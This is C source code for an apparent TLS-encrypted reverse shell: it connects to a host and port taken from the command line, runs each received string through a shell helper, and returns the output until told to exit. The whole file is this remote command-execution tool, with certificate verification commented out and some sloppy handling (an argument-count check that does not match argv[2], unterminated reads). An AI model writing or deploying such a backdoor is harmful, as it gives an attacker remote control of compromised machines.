#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/x509v3.h>
#include "utils/shell.h"
#include "utils/socket.h"

int main(int argc, char **argv) {
  if(argc < 2) return -1;
  int sock;
  SSL *ssl;
  SSL_CTX *ctx;
  const SSL_METHOD *method;
  X509_VERIFY_PARAM *param;
  /* init */
  SSL_load_error_strings();
  OpenSSL_add_ssl_algorithms();

  /* create context */
  method = SSLv23_client_method();

  if (!(ctx = SSL_CTX_new(method))) {
    exit(1);
  }

  /* configure context */
 //SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, NULL);
  //SSL_CTX_set_verify_depth(ctx, 4);
  //SSL_CTX_load_verify_locations(ctx, "/etc/ssl/cert.pem", NULL);
  SSL_CTX_set_options(ctx, SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3 | SSL_OP_NO_TLSv1 | SSL_OP_NO_TLSv1_1 | SSL_OP_NO_COMPRESSION);

  /* open a socket */
  sock = create_socket(argv[1],strtol(argv[2],NULL,0));
  /* create ssl instance from context */
  ssl = SSL_new(ctx);

  param = SSL_get0_param(ssl);

  X509_VERIFY_PARAM_set_hostflags(param, X509_CHECK_FLAG_NO_PARTIAL_WILDCARDS);
  X509_VERIFY_PARAM_set1_host(param, "localhost", 0);

  /* assign socket to ssl intance */
  SSL_set_fd(ssl, sock);

  /* perform ssl handshake & connection */
  SSL_connect(ssl);

  /* perform ssl reads / writes */

  // SSL_read(ssl, buff, 255);

  char buff[4096]="";
  char * comout;
  while(strncmp(buff,"exit",4) !=0){
    SSL_read(ssl, buff, 255);
    shell(buff,&comout);
    SSL_write(ssl,comout,strlen(comout)); 
    free(comout);
    strcpy(buff, "");
  }
  /* cleanup */
  SSL_free(ssl);
  SSL_CTX_free(ctx);
  EVP_cleanup();
}
